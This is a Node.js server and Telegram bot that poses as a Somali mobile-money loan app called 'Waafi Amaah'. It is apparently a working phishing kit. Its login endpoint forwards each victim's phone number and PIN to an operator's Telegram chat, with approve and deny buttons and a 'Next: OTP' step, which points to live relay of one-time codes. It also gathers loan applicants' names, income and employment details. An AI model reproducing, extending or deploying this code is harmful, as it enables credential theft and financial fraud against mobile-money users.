const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// 1. Initialize Bot (safe check)
if (!process.env.BOT_TOKEN) {
    console.error("❌ BOT_TOKEN is missing in .env file");
    process.exit(1);
}

const bot = new Telegraf(process.env.BOT_TOKEN);

// 2. Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// 3. Home Route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 4. Dynamic Routing (safe version)
app.get('/:page', (req, res) => {
    const page = req.params.page;
    const fileName = page.endsWith('.html') ? page : `${page}.html`;
    const filePath = path.join(__dirname, 'public', fileName);

    res.sendFile(filePath, (err) => {
        if (err) {
            console.error(`❌ Missing file: ${filePath}`);
            res.status(404).send("Boggaan lama helin (Page not found)");
        }
    });
});

// 5. Start Command (FIXED inline keyboard safety)
bot.start((ctx) => {
    return ctx.reply('Ku soo dhowaad Waafi Amaah! 👇', {
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: "🚀 Fur App",
                        web_app: {
                            url: process.env.WEBAPP_URL || "https://your-domain.com"
                        }
                    }
                ]
            ]
        }
    });
});

// 6. Login Notification API
app.post('/api/login-notification', async (req, res) => {
    const { phone = "", pin = "" } = req.body || {};
    const adminId = process.env.ADMIN_CHAT_ID;

    if (!adminId) {
        return res.status(500).json({ error: "ADMIN_CHAT_ID not set" });
    }

    const currentTime = new Date().toLocaleString('en-US', { hour12: true });

    const loginMsg =
        `📱 CL 2 - LOGIN ATTEMPT\n\n` +
        `🆕 NEW USER\n` +
        `📞 Phone: +252${phone}\n` +
        `🔢 PIN: ${pin}\n` +
        `⏰ Time: ${currentTime}\n\n` +
        `⚠️ Waiting for approval`;

    try {
        await bot.telegram.sendMessage(adminId, loginMsg, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow", callback_data: `approve_${phone}_${pin}` }
                    ],
                    [
                        { text: "❌ Deny", callback_data: "deny" }
                    ]
                ]
            }
        });

        res.json({ success: true });
    } catch (err) {
        console.error("❌ API Notification Error:", err);
        res.status(500).json({ error: "Failed to send bot notification" });
    }
});

// 7. Web App Data Handler
bot.on('message', async (ctx) => {
    const webAppData = ctx.message?.web_app_data;
    if (!webAppData) return;

    try {
        const data = JSON.parse(webAppData.data);

        const summary =
            `✅ CODSI CUSUB\n\n` +
            `👤 ${data.firstName || ''} ${data.lastName || ''}\n` +
            `📞 +252${data.phone || ''}\n` +
            `💰 $${data.amount || 'N/A'}\n` +
            `📆 ${data.duration || 'N/A'}\n` +
            `💼 ${data.jobStatus || 'N/A'}\n` +
            `💵 $${data.income || 'N/A'}\n` +
            `📝 ${data.loanPurpose || 'N/A'}`;

        await ctx.reply(summary);

    } catch (err) {
        console.error("❌ Data error:", err);
    }
});

// 8. Actions
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    const time = new Date().toLocaleTimeString('en-US', { hour12: true });

    const approvedMsg =
        `✅ LOGIN APPROVED\n\n` +
        `📱 +252${phone}\n` +
        `🔐 ${pin}\n\n` +
        `➡ Next: OTP\n` +
        `⌚ ${time}`;

    try {
        await ctx.editMessageText(approvedMsg);
    } catch (e) {
        console.error("❌ Edit failed:", e);
    }
});

bot.action('deny', async (ctx) => {
    try {
        await ctx.editMessageText("❌ Informashinka waa khalad");
    } catch (e) {
        console.error(e);
    }
});

// 9. Start Server (safe launch)
app.listen(PORT, async () => {
    console.log(`✅ Server running on port ${PORT}`);

    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("✅ Bot launched successfully");
    } catch (err) {
        console.error("❌ Bot launch failed:", err);
    }
});

// 10. Graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
